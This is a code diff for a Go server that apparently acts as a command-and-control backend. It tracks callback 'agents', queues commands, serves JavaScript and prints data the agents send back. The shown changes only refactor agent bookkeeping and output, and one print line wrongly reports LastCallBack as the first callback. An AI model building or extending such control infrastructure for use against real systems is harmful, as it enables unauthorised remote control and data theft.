@@ -15,23 +15,28 @@ type Agent struct{
 	FirstCallBack int64
 }
 
-var Agents []Agent
+var Agents = make(map[string]Agent)
 var Commands = make(map[string][]string)
 
 
 func AddAgent(w http.ResponseWriter, r *http.Request){
+	var newAgent bool
 	vars := mux.Vars(r)
 	name := vars["agent"]
 	currentTime := time.Now().Unix()
-	newAgent := true
-	for _,agent := range Agents{
-		if agent.Name == name {
-			agent.LastCallBack = currentTime
-			newAgent = false
-		}
+	newAgent = true
+
+	_, exists := Agents[name]
+	if exists{
+		newAgent = false
+		agent := Agents[name]
+		agent.LastCallBack = currentTime
+		Agents[name] = agent
 	}
+
+
 	if newAgent{
-		Agents = append(Agents,Agent{Name:name,FirstCallBack:currentTime,LastCallBack:currentTime})
+		Agents[name] = Agent{name,currentTime,currentTime}
 		fmt.Println(fmt.Sprintf("\n[+] Agent %s is Active [+]",name))
 	}
 
@@ -58,9 +63,11 @@ func AddCommand(agentName string, command string)  {
 func PrintAgents(){
 	if len(Agents) < 1{
 		fmt.Println("[-] No Agents are active [-]")
+		return
 	}
+	fmt.Println("\nActive Agents\n")
 	for _,agent := range Agents{
-		fmt.Println(agent.Name)
+		fmt.Println(fmt.Sprintf("Name : %s \t Last Callback: %d \t First Callback: %d",agent.Name,agent.LastCallBack,agent.LastCallBack))
 	}
 }
 
@@ -68,10 +75,10 @@ func RemoveInactiveAgents(){
 
 	for {
 		time.Sleep(5 * time.Second)
-		for i, agent := range Agents {
+		for _, agent := range Agents {
 			// Removes the Agent from array if no callback was received last 30 seconds.
 			if agent.LastCallBack < (time.Now().Unix() - 30) {
-				Agents = append(Agents[:i], Agents[i+1:]...)
+				delete(Agents,agent.Name)
 				fmt.Println(fmt.Sprintf("[-] Agent %s is inactive",agent.Name))
 			}
 		}
@@ -96,11 +103,18 @@ func GetJS(w http.ResponseWriter, r *http.Request){
 }
 
 func PrintData(w http.ResponseWriter, r *http.Request){
+	var data []string
 	vars := mux.Vars(r)
 	name := vars["agent"]
-	data := r.FormValue("data")
-	fmt.Println(fmt.Sprintf("[+] Incoming Data from : %s [+]",name))
-	fmt.Println(data)
+	json_data := r.FormValue("data")
+	fmt.Println(fmt.Sprintf("\n[+] Incoming Data from : %s [+]",name))
+
+	// Decode json data
+	json.Unmarshal([]byte(json_data),&data)
+
+	for _, d := range data{
+		fmt.Println(fmt.Sprintf("\n--------------------RESPONSE-----------------------\n%s",d))
+	}
 	w.Write([]byte("OK"))
 }
 
